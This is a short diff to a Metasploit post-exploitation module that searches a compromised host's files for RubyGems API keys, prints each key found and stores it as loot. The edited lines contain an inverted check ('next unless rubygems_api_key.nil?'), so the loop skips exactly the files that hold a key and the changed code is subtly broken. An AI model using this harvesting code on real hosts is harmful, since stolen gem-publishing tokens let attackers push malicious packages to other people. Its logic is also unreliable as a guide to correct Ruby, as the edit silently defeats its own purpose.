@@ -44,12 +44,9 @@ class Metasploit3 < Msf::Post
       path.chomp!
       next if [".", ".."].include?(path)
 
-      if key = YAML.load(read_file(path))[:rubygems_api_key]
-        rubygems_api_key = key
-      else
-        next
-      end
-
+      rubygems_api_key = YAML.load(read_file(path))[:rubygems_api_key]
+      next unless rubygems_api_key.nil?
+      
       print_good("Found a RubyGems API Key: #{rubygems_api_key}")
 
       loot_path = store_loot("host.rubygems.apikey",
